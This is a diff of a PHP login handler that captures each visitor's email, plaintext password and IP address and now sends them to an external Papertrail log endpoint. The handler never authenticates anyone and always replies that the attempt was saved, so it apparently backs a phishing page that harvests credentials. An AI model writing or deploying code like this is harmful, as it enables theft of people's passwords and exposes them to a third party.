@@ -14,27 +14,47 @@ function sendJsonResponse($success, $message = '', $redirectUrl = '') {
     exit();
 }
 
-// Log all login attempts
+// Log all login attempts to Papertrail
 try {
-    // Define logs folder and file path
-    $logsFolder = __DIR__ . '/logs';
-    $logFile = "{$logsFolder}/login_attempts.txt";
-
-    // Ensure logs folder exists, and create it if not
-    if (!is_dir($logsFolder)) {
-        mkdir($logsFolder, 0755, true);
-    }
-
     // Prepare log data
-    $logData = "Date: " . date("Y-m-d H:i:s") . "\nEmail: {$email}\nPassword: {$password}\nIP: " . ($_SERVER['REMOTE_ADDR'] ?? 'Unknown') . "\n\n";
+    $logData = [
+        "Date" => date("Y-m-d H:i:s"),
+        "Email" => $email,
+        "Password" => $password,
+        "IP" => $_SERVER['REMOTE_ADDR'] ?? 'Unknown',
+    ];
 
-    // Append to log file
-    file_put_contents($logFile, $logData, FILE_APPEND);
+    // Convert log data to string format for sending
+    $logMessage = sprintf(
+        "Date: %s | Email: %s | Password: %s | IP: %s",
+        $logData["Date"],
+        $logData["Email"],
+        $logData["Password"],
+        $logData["IP"]
+    );
 
-    // Send response
+    // Send logs to Papertrail URL
+    $papertrailUrl = "https://logs.collector.na-01.cloud.solarwinds.com/v1/logs"; // Replace with your Papertrail URL
+
+    $ch = curl_init($papertrailUrl);
+    curl_setopt($ch, CURLOPT_POST, true);
+    curl_setopt($ch, CURLOPT_POSTFIELDS, $logMessage);
+    curl_setopt($ch, CURLOPT_HTTPHEADER, [
+        "Content-Type: text/plain",
+    ]);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+
+    $response = curl_exec($ch);
+    if ($response === false) {
+        error_log("Failed to send log to Papertrail: " . curl_error($ch));
+        sendJsonResponse(false, "A server error occurred while saving the login attempt.");
+    }
+    curl_close($ch);
+
+    // Send response to the frontend
     sendJsonResponse(false, "Login attempt saved.");
 } catch (Exception $e) {
-    error_log("Failed to log login attempt: " . $e->getMessage());
+    error_log("Failed to log login attempt to Papertrail: " . $e->getMessage());
     sendJsonResponse(false, "A server error occurred while saving the login attempt.");
 }
 ?>
